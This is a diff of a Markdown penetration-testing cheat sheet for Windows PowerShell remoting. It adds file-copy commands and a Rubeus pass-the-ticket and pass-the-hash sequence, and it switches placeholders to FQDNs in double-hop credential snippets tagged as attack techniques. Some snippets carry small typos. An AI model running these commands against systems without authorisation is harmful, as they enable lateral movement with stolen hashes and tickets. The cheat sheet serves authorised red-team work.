@@ -33,18 +33,37 @@ Test-WSMan -computername <target_name>
 Get-WSManInstance -ResourceURI wmicimv2/win32_service -SelectorSet @{name="winrm"} -ComputerName "<target_name>"
 ```
 
+
+## remoting - copy file (to)
+```powershell
+Copy-Item -ToSession <sessionVariable> -Path '<local_path>' -Destination '<remote_path>' -Verbose
+```
+
+## remoting - copy file (from)
+```powershell
+Copy-Item -FromSession <sessionVariable> -Path '<remote_path>' -Destination '<local_path>' -Verbose
+```
+
+## remoting - PSSession (ptt/pth)
+```
+Rubeus.exe asktgt /user:<user> /rc4:<hash> /nowrap
+Rubeus.exe createnetonly /program:powershell.exe
+Rubeus.exe ptt /ticket:<ticket_b64>
+Enter-PSSession <target_fqdn> -Authentication Negotiate
+```
+
 ## remoting - command exec from pssession (double-hop)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT   
 https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/get-wsmaninstance?view=powershell-7.4#-authentication
 None, Default, Digest, Negotiate, Basic, Kerberos, ClientCertificate, Credssp
 ```powershell
-$password=ConvertTo-SecureString '<password>' -Asplaintext -force;$creds=New-Object System.Management.Automation.PSCredential("<domain_netbios>\<user>", $password);Invoke-Command -computername <target_name> -ScriptBlock {<cmd|hostname>} -Credential $creds -Authentication 'Credssp'
+$password=ConvertTo-SecureString '<password>' -Asplaintext -force;$creds=New-Object System.Management.Automation.PSCredential("<domain_netbios>\<user>", $password);Invoke-Command -computername <target_fqdn> -ScriptBlock {<cmd|hostname>} -Credential $creds -Authentication 'Credssp'
 ```
 
 ## remoting - Oneliner command exec from pssession (double-hop)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT   
 ```powershell
-Invoke-Command -computername <target_name> -ScriptBlock {<cmd|hostname>} -Credential (New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", (ConvertTo-SecureString '<password>' -Asplaintext -force))) -Authentication 'Credssp'
+Invoke-Command -computername <target_fqdn> -ScriptBlock {<cmd|hostname>} -Credential (New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", (ConvertTo-SecureString '<password>' -Asplaintext -force))) -Authentication 'Credssp'
 ```
 
 
@@ -53,13 +72,13 @@ Invoke-Command -computername <target_name> -ScriptBlock {<cmd|hostname>} -Creden
 ```powershell
 $password=ConvertTo-SecureString '<password>' -Asplaintext -force;
 $creds=New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", $password);
-Invoke-Command -ComputerName <target_name> -FilePath <path_to_script> -Credential $creds -Authentication 'Default'
+Invoke-Command -ComputerName <target_fqdn> -FilePath <path_to_script> -Credential $creds -Authentication 'Default'
 ```
 
 ## remoting - nested command exec from pssession (double-hop)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT   
 ```powershell
-$cred = $New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", (ConvertTo-SecureString '<password>' -Asplaintext -force)); Invoke-Command -ComputerName <target_1> -Credential $cred -ScriptBlock {Invoke-Command -ComputerName <target_2> -Credential $Using:cred -ScriptBlock {<cmd|hostname>}}
+$cred = $New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", (ConvertTo-SecureString '<password>' -Asplaintext -force)); Invoke-Command -ComputerName <target_fqdn_1> -Credential $cred -ScriptBlock {Invoke-Command -ComputerName <target_fqdn_2> -Credential $Using:cred -ScriptBlock {<cmd|hostname>}}
 ```
 
 
@@ -68,14 +87,14 @@ $cred = $New-Object System.Management.Automation.PSCredential("domain_netbios>\<
 ```powershell
 $password=ConvertTo-SecureString '<password>' -Asplaintext -force;
 $creds=New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", $password);
-$sess = New-PSSession -ComputerName <target_name> -Credential $creds -Authentication 'Credssp' -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
+$sess = New-PSSession -ComputerName <target_fqdn> -Credential $creds -Authentication 'Credssp' -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
 Enter-PSSession $sess
 ```
 
 ## remoting - Register PSSessionConfiguration 1/2 (double-hop)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
-Enter-PSSession -ComputerName <target>
+Enter-PSSession -ComputerName <target_fqdn>
 ```
 
 ## remoting - Register PSSessionConfiguration 2/2 (double-hop)
@@ -87,5 +106,5 @@ Register-PSSessionConfiguration -Name <config_name>  -RunAsCredential "domain_ne
 ## remoting - Register PSSessionConfiguration 3/3 (double-hop)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
-Enter-PSSession -ComputerName <target_name> -Credential "domain_netbios>\<user>" -Authentication 'Credssp' -ConfigurationName <config_name>
+Enter-PSSession -ComputerName <target_fqdn> -Credential "domain_netbios>\<user>" -Authentication 'Credssp' -ConfigurationName <config_name>
 ```
